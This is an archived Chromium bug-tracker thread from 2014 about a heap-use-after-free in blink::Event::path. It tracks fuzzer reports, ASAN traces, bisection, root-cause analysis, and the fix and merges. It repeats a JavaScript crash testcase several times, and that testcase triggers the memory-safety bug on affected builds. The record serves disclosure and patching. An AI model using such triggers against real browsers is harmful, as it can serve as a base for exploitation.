# Heap-use-after-free in blink::Event::path

| Field | Value |
|-------|-------|
| **Issue ID** | [40080161](https://issues.chromium.org/issues/40080161) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>SVG |
| **Platforms** | Linux |
| **Reporter** | cl...@gmail.com |
| **Assignee** | vo...@chromium.org |
| **Created** | 2014-08-04 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

The attached testcase crashes the latest ASAN build of chrome.

**VERSION**  

Chrome Version: asan-symbolized-linux-release-287271  

Operating System: Linux

**REPRODUCTION CASE**  

Attached

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State: ASAN output in debug.txt

## Attachments

- [svgx.svg](attachments/svgx.svg) (image/svg+xml, 123 B)
- [debug.txt](attachments/debug.txt) (text/plain, 10.9 KB)
- [crash.html](attachments/crash.html) (text/html, 569 B)

## Timeline

### cl...@chromium.org (2014-08-04)

ClusterFuzz is analyzing your testcase. See https://cluster-fuzz.appspot.com/testcase?key=5727204686168064

### me...@chromium.org (2014-08-05)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-08-05)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5727204686168064

Uploader: aarya@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x614000000e80
Crash State:
  - crash stack -
  blink::Event::path
  blink::EventV8Internal::pathAttributeGetterCallback
  - free stack -
  v8::internal::GlobalHandles::Node::PostGarbageCollectionProcessing
  v8::internal::GlobalHandles::PostGarbageCollectionProcessing
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=274265:274467

Minimized Testcase (0.49 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv946SdqmuJMyriws_rFwXr612WbN8Adp-_YN-8YqpLfx4nu7ugH2htwLzJh7dRO8zThnobVBoGZoD5UddR4m5V5ZyRXzh4Fi-tVVB0aVZATlEU9maKxNNGKUBYyDDY1CHZqF7jj0z2SM3tueCRjFEj0lFpgrkA
<script>
function start() {
o9=document.documentElement;
o38=o9.ownerDocument.createElementNS('http://www.w3.org/1999/xhtml','iframe');
o38.onload=cb_focssiframes_5_1;
o9.appendChild(o38);
}
function cb_focssiframes_5_1() {
o39=o38.contentDocument.defaultView;
o39.onpageshow=cb_onpageshow_23_1;
o38.src=null;
window.setTimeout('window.top.start_pause0()',100);
}
function cb_onpageshow_23_1() {
o50=arguments[0];
}
function start_pause0() {
gc();
alert(o50.path);
}
</script>
<body onload="start()">




### in...@chromium.org (2014-08-05)

from regression range, might be http://src.chromium.org/viewvc/blink?view=rev&revision=175174. Nate, can you please take a look.

### ja...@chromium.org (2014-08-05)

Is there any hope of getting the rest of the free stack? It'd be useful to know what's under v8 there.

My patch seems pretty unlikely to cause that problem (and that case is quite difficult to hit reliably). My best guess is http://src.chromium.org/viewvc/blink?revision=175307&view=revision.

rob.buis, feel free to reassign to me if this doesn't look like you.

### in...@chromium.org (2014-08-05)

Retrying symbolize task to get more stack frames in free stack. Otherwise, when you are trying to reproduce locally, change ASAN_OPTIONS=malloc_context_size=128, that should get you 128 frames.

### pd...@chromium.org (2014-08-06)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-08-09)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-08-09)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5727204686168064

Uploader: aarya@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x614000000e80
Crash State:
  - crash stack -
  blink::Event::path
  blink::EventV8Internal::pathAttributeGetterCallback
  - free stack -
  v8::internal::GlobalHandles::Node::PostGarbageCollectionProcessing
  v8::internal::GlobalHandles::PostGarbageCollectionProcessing
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=274265:274467

Minimized Testcase (0.49 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv946SdqmuJMyriws_rFwXr612WbN8Adp-_YN-8YqpLfx4nu7ugH2htwLzJh7dRO8zThnobVBoGZoD5UddR4m5V5ZyRXzh4Fi-tVVB0aVZATlEU9maKxNNGKUBYyDDY1CHZqF7jj0z2SM3tueCRjFEj0lFpgrkA
<script>
function start() {
o9=document.documentElement;
o38=o9.ownerDocument.createElementNS('http://www.w3.org/1999/xhtml','iframe');
o38.onload=cb_focssiframes_5_1;
o9.appendChild(o38);
}
function cb_focssiframes_5_1() {
o39=o38.contentDocument.defaultView;
o39.onpageshow=cb_onpageshow_23_1;
o38.src=null;
window.setTimeout('window.top.start_pause0()',100);
}
function cb_onpageshow_23_1() {
o50=arguments[0];
}
function start_pause0() {
gc();
alert(o50.path);
}
</script>
<body onload="start()">




### cl...@chromium.org (2014-08-09)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-08-13)

rob.buis@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### rw...@gmail.com (2014-08-13)

I don't see how http://src.chromium.org/viewvc/blink?revision=175307&view=revision could be related to this. That is about SVG instances, but there seems to be no SVG usage in the minimized testcase.

### ja...@chromium.org (2014-08-13)

My guess had been based on the change you made to EventPath, though it is genuinely a guess.

### cl...@chromium.org (2014-08-18)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-08-21)

rob.buis@: Uh oh! This issue is still open and hasn't been updated in the last 7 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### cl...@chromium.org (2014-08-21)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5727204686168064

Uploader: aarya@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x614000000e80
Crash State:
  blink::Event::path
  blink::EventV8Internal::pathAttributeGetterCallback
  - free stack -
  v8::internal::GlobalHandles::Node::PostGarbageCollectionProcessing
  v8::internal::GlobalHandles::PostGarbageCollectionProcessing
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=267322:267343

Minimized Testcase (0.49 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv946SdqmuJMyriws_rFwXr612WbN8Adp-_YN-8YqpLfx4nu7ugH2htwLzJh7dRO8zThnobVBoGZoD5UddR4m5V5ZyRXzh4Fi-tVVB0aVZATlEU9maKxNNGKUBYyDDY1CHZqF7jj0z2SM3tueCRjFEj0lFpgrkA
<script>
function start() {
o9=document.documentElement;
o38=o9.ownerDocument.createElementNS('http://www.w3.org/1999/xhtml','iframe');
o38.onload=cb_focssiframes_5_1;
o9.appendChild(o38);
}
function cb_focssiframes_5_1() {
o39=o38.contentDocument.defaultView;
o39.onpageshow=cb_onpageshow_23_1;
o38.src=null;
window.setTimeout('window.top.start_pause0()',100);
}
function cb_onpageshow_23_1() {
o50=arguments[0];
}
function start_pause0() {
gc();
alert(o50.path);
}
</script>
<body onload="start()">




### am...@chromium.org (2014-08-21)

If we need to get this into M37 in the first stable patch, we need to get the issue fixed ASAP.  Who can take ownership and drive to closure?

### pd...@chromium.org (2014-08-21)

I'll take this.

@rob.buis, please make these bugs your highest priority and ask for help if you're unable to look at it quickly. We didn't need to let our users run with this vulnerability for a month.

### pd...@chromium.org (2014-08-21)

I am able to reproduce this locally (make sure to use --js-flags="--expose-gc"). This isn't Rob's change after all.

@haraken, this is one of your changes from crbug.com/357144. Could you please take a look?

### ha...@chromium.org (2014-08-22)

pdr@: Why do you think this is due to one of my changes in crbug.com/357144?

As far as I see the crash report:

- The crash is not related to ScriptState.
- The crash cause is that V8 accesses event.path after the event object is garbage-collected. This looks very strange.

I'm not sure if this is a pure bug of V8's GC, since the repro case is doing something complicated that involves page navigation.


### pd...@chromium.org (2014-08-22)

@haraken, I have now done the manual bisect. It only took a few hours.
chromium 274467, blink 175314 - BAD
chromium 274467, blink 175304 - BAD
chromium 274467, blink 175277 - BAD
chromium 274465, blink 175275 - BAD
chromium 274465, blink 175260 - BAD
chromium 274465, blink 175245 - BAD
chromium 274465, blink 175241 - BAD
chromium 274465, blink 175240 - GOOD
chromium 274465, blink 175230 - GOOD
chromium 274465, blink 175200 - GOOD

The bad change is blink@175241:
http://src.chromium.org/viewvc/blink?revision=175241&view=revision

### ha...@chromium.org (2014-08-22)

> @haraken, I have now done the manual bisect. It only took a few hours.

I'm sorry I've bothered you a lot...

Let me take a look at this.


### ha...@chromium.org (2014-08-25)

pdr@: Sorry but would you tell me how to reproduce the crash?

When I run the test case, I hit the following exception and cannot get to the crash.

> Uncaught SecurityError: Failed to read the 'contentDocument' property from 'HTMLIFrameElement': Blocked a frame with origin "null" from accessing a frame with origin "null". Protocols, domains, and ports must match.


### pd...@chromium.org (2014-08-25)

@haraken, you'll need to use a local server for this one. You can start one with "python -m SimpleHTTPServer" which will then be served off localhost:8000.

### ha...@chromium.org (2014-08-25)

Hmm, it's a bit hard to identify the root cause. I confirmed that r175241 exposed the bug, but I'm not quite sure if this is a bug introduced by r175241. It's possible that r175241 just exposed a bug of V8 GC that had been existed before r175241.

Here is a minimized test case.

<body>
<script>
iframe = document.createElement('iframe');
iframe.src = 'a.html';
iframe.onload = func1;
document.body.appendChild(iframe);

function func1() {
  iframe.contentWindow.onpageshow = func2;
  iframe.src = null;
  setTimeout('func3()', 100);
}

function func2() {
  e = arguments[0];
  console.log("aaa:"); console.log(e);
}

function func3() {
  console.log("bbb:"); console.log(e);  // At this point |e| is alive.
  gc(); gc(); gc(); gc();               // These GCs collect |e|
  console.log("ccc:"); console.log(e);  // This crashes because e.path cannot be accessed.
  // alert(e.path);
}
</script>
</body>

It looks strange that |e| is collected even though |e| is still reachable.

Adding V8 experts.


### am...@chromium.org (2014-08-25)

[Empty comment from Monorail migration]

### am...@chromium.org (2014-08-25)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-08-27)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5727204686168064

Uploader: aarya@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x614000000e80
Crash State:
  blink::Event::path
  blink::EventV8Internal::pathAttributeGetterCallback
  - free stack -
  v8::internal::GlobalHandles::Node::PostGarbageCollectionProcessing
  v8::internal::GlobalHandles::PostGarbageCollectionProcessing
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=267322:267343

Minimized Testcase (0.49 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv946SdqmuJMyriws_rFwXr612WbN8Adp-_YN-8YqpLfx4nu7ugH2htwLzJh7dRO8zThnobVBoGZoD5UddR4m5V5ZyRXzh4Fi-tVVB0aVZATlEU9maKxNNGKUBYyDDY1CHZqF7jj0z2SM3tueCRjFEj0lFpgrkA
<script>
function start() {
o9=document.documentElement;
o38=o9.ownerDocument.createElementNS('http://www.w3.org/1999/xhtml','iframe');
o38.onload=cb_focssiframes_5_1;
o9.appendChild(o38);
}
function cb_focssiframes_5_1() {
o39=o38.contentDocument.defaultView;
o39.onpageshow=cb_onpageshow_23_1;
o38.src=null;
window.setTimeout('window.top.start_pause0()',100);
}
function cb_onpageshow_23_1() {
o50=arguments[0];
}
function start_pause0() {
gc();
alert(o50.path);
}
</script>
<body onload="start()">




### am...@chromium.org (2014-08-27)

how are we doing on a fix for this?

### ha...@chromium.org (2014-08-28)

[Empty comment from Monorail migration]

### vo...@chromium.org (2014-08-28)

Looked into this, with plenty of help from Kentaro, Toon and Marja.
1, I can reliably reproduce this.
2, Our analysis ends up in a different place from Kentaro's.
3, I have a somewhat simplistic fix. Currently discussing whether the fix makes sense.

Will update the issue with a more complete explanation & send a CL.

### vo...@chromium.org (2014-08-28)

I consistently saw a stack trace like so:
  #3 0x7f7c6069b305 blink::Event::path()
  #4 0x7f7c5fa3335c blink::EventV8Internal::pathAttributeGetter()
  #5 0x7f7c5fa3325d blink::EventV8Internal::pathAttributeGetterCallback()
  #6 0x7f7c6aea9ce4 v8::internal::PropertyCallbackArguments::Call()

Unlike the earlier analysis, I did not find GlobalHandles::PostGarbageCollectionProcessing on the stack. Furthermore, commenting out the 'gc()' line in the test case still triggered the bug. (There's still GC happening, so that by itself may not mean that much.)

In the debugger, we saw a clean stack and a valid instance of: Event* impl. However, the impl.m_currentTarget pointed to 0xcdcdcd...cd (guard value for deleted memory). Since m_currentTarget is a RawPtr, the idea is that whoever puts a value in it will also keep the value alive. Apparently, someone didn't.

The fix is quite simply to make it a RefPtr, so the Event object itself will keep m_currentTarget alive.


Two additional comments from Kentaro:

- "The reason why we've used a raw pointer is that m_currentTarget is basically used on stack, and thus we thought there's no need to make it a RefPtr. However, that's not the case when pages navigate in a tricky way."

This is consistent with the observations & the test cases, which provoke the situation with timer-based navigation event.

- "the point is that m_currentTarget is guaranteed to be cleared in a finite time, which means that it can't be a source of a reference cycle. Even if it creates a cycle, the cycle is guaranteed to get broken in a finite time. Thus it's safe to use a RefPtr."

So maybe RefPtr isn't the best fix; but it shouldn't cause any harm.


I'll send a CL. Thanks everyone for the help.



### vo...@chromium.org (2014-08-28)

Fix is on its way: https://codereview.chromium.org/516843004/

### bu...@chromium.org (2014-09-01)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=181200

------------------------------------------------------------------
r181200 | vogelheim@chromium.org | 2014-09-01T18:52:48.563058Z

Changed paths:
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/dom/crash-on-querying-event-path.html?r1=181200&r2=181199&pathrev=181200
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/events/Event.cpp?r1=181200&r2=181199&pathrev=181200
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/dom/crash-on-querying-event-path-expected.txt?r1=181200&r2=181199&pathrev=181200
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/events/Event.h?r1=181200&r2=181199&pathrev=181200

Fix crash when accessing Event::path().

(A more elaborate account of the details is found in the bug report.)

BUG=400476
R=haraken@chromium.org

Review URL: https://codereview.chromium.org/516843004
-----------------------------------------------------------------

### in...@chromium.org (2014-09-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2014-09-01)

Is there a merge required here?

### cl...@chromium.org (2014-09-01)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### bu...@chromium.org (2014-09-02)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=181205

------------------------------------------------------------------
r181205 | tkent@chromium.org | 2014-09-02T01:55:04.960616Z

Changed paths:
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/events/Event.cpp?r1=181205&r2=181204&pathrev=181205
   D http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/dom/crash-on-querying-event-path-expected.txt?r1=181205&r2=181204&pathrev=181205
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/events/Event.h?r1=181205&r2=181204&pathrev=181205
   D http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/dom/crash-on-querying-event-path.html?r1=181205&r2=181204&pathrev=181205

Revert of Fix crash when accessing Event::path(). (patchset #4 id:60001 of https://codereview.chromium.org/516843004/)

Reason for revert:
The test crash-on-querying-event-path.html is unacceptably flaky.
http://test-results.appspot.com/dashboards/flakiness_dashboard.html#group=@ToT%20Blink&tests=http%2Ftests%2Fdom%2Fcrash-on-querying-event-path.html&testType=layout-tests


Original issue's description:
> Fix crash when accessing Event::path().
> 
> (A more elaborate account of the details is found in the bug report.)
> 
> BUG=400476
> R=haraken@chromium.org
> 
> Committed: https://src.chromium.org/viewvc/blink?view=rev&revision=181200

TBR=haraken@chromium.org,vogelheim@chromium.org
NOTREECHECKS=true
NOTRY=true
BUG=400476

Review URL: https://codereview.chromium.org/532593002
-----------------------------------------------------------------

### in...@chromium.org (2014-09-02)

[Empty comment from Monorail migration]

### bu...@chromium.org (2014-09-02)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=181234

------------------------------------------------------------------
r181234 | vogelheim@chromium.org | 2014-09-02T12:34:05.410977Z

Changed paths:
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/dom/crash-on-querying-event-path-expected.txt?r1=181234&r2=181233&pathrev=181234
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/events/Event.h?r1=181234&r2=181233&pathrev=181234
   A http://src.chromium.org/viewvc/blink/trunk/LayoutTests/http/tests/dom/crash-on-querying-event-path.html?r1=181234&r2=181233&pathrev=181234
   M http://src.chromium.org/viewvc/blink/trunk/Source/core/events/Event.cpp?r1=181234&r2=181233&pathrev=181234

Fix crash when accessing Event::path(). Now with de-flaked test.

This is a re-try of crrev.com/516843004. In order to de-flake the test,
the nextIframeLoaded function checks whether finishJSTest (called from
within that function) has already been called, thus ensuring that the
guts of the test will only be executed once.

BUG=400476
R=haraken@chromium.org

Review URL: https://codereview.chromium.org/533633002
-----------------------------------------------------------------

### in...@chromium.org (2014-09-02)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-09-03)

ClusterFuzz has detected this issue as fixed in range 292881:292892.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5727204686168064

Uploader: aarya@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x614000000e80
Crash State:
  blink::Event::path
  blink::EventV8Internal::pathAttributeGetterCallback
  - free stack -
  v8::internal::GlobalHandles::Node::PostGarbageCollectionProcessing
  v8::internal::GlobalHandles::PostGarbageCollectionProcessing
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=267322:267343
Fixed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=292881:292892

Minimized Testcase (0.49 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv946SdqmuJMyriws_rFwXr612WbN8Adp-_YN-8YqpLfx4nu7ugH2htwLzJh7dRO8zThnobVBoGZoD5UddR4m5V5ZyRXzh4Fi-tVVB0aVZATlEU9maKxNNGKUBYyDDY1CHZqF7jj0z2SM3tueCRjFEj0lFpgrkA
<script>
function start() {
o9=document.documentElement;
o38=o9.ownerDocument.createElementNS('http://www.w3.org/1999/xhtml','iframe');
o38.onload=cb_focssiframes_5_1;
o9.appendChild(o38);
}
function cb_focssiframes_5_1() {
o39=o38.contentDocument.defaultView;
o39.onpageshow=cb_onpageshow_23_1;
o38.src=null;
window.setTimeout('window.top.start_pause0()',100);
}
function cb_onpageshow_23_1() {
o50=arguments[0];
}
function start_pause0() {
gc();
alert(o50.path);
}
</script>
<body onload="start()">

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.


### in...@chromium.org (2014-09-03)

Merge Requested for both m37 and m38. M37 should be merged asap, once approved label changes.

### am...@chromium.org (2014-09-03)

removing m37 per inferno@

### [Deleted User] (2014-09-04)

[Empty comment from Monorail migration]

### in...@chromium.org (2014-09-04)

merged to m38 in r181372

### bu...@chromium.org (2014-09-04)

The following revision refers to this bug:
  http://src.chromium.org/viewvc/blink?view=rev&rev=181372

------------------------------------------------------------------
r181372 | inferno@chromium.org | 2014-09-04T15:52:04.287258Z

Changed paths:
   A http://src.chromium.org/viewvc/blink/branches/chromium/2125/LayoutTests/http/tests/dom/crash-on-querying-event-path-expected.txt?r1=181372&r2=181371&pathrev=181372
   M http://src.chromium.org/viewvc/blink/branches/chromium/2125/Source/core/events/Event.h?r1=181372&r2=181371&pathrev=181372
   A http://src.chromium.org/viewvc/blink/branches/chromium/2125/LayoutTests/http/tests/dom/crash-on-querying-event-path.html?r1=181372&r2=181371&pathrev=181372
   M http://src.chromium.org/viewvc/blink/branches/chromium/2125/Source/core/events/Event.cpp?r1=181372&r2=181371&pathrev=181372

Merge 181234 "Fix crash when accessing Event::path(). Now with d..."

> Fix crash when accessing Event::path(). Now with de-flaked test.
> 
> This is a re-try of crrev.com/516843004. In order to de-flake the test,
> the nextIframeLoaded function checks whether finishJSTest (called from
> within that function) has already been called, thus ensuring that the
> guts of the test will only be executed once.
> 
> BUG=400476
> R=haraken@chromium.org
> 
> Review URL: https://codereview.chromium.org/533633002

TBR=vogelheim@chromium.org

Review URL: https://codereview.chromium.org/544683002
-----------------------------------------------------------------

### aa...@google.com (2014-09-12)

[Empty comment from Monorail migration]

### in...@chromium.org (2014-09-12)

[Empty comment from Monorail migration]

### aa...@google.com (2014-09-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2014-09-16)

[Empty comment from Monorail migration]

### ti...@chromium.org (2014-10-03)

[Empty comment from Monorail migration]

### ti...@chromium.org (2014-10-07)

Congratulations - $3000 for this under our new reward pricing. Notes from the panel: "nice control between use and free via JS".

### ti...@chromium.org (2014-10-08)

[Empty comment from Monorail migration]

### ti...@google.com (2014-12-08)

Payment in progress

### ti...@google.com (2014-12-09)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-12-09)

Bulk update: removing view restriction from closed bugs.

### ti...@google.com (2014-12-22)

Processing via our e-payment system can take up to six weeks, but the reward should be on its way to you. Thanks again for your help!

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/400476?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/410732]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40080161)*
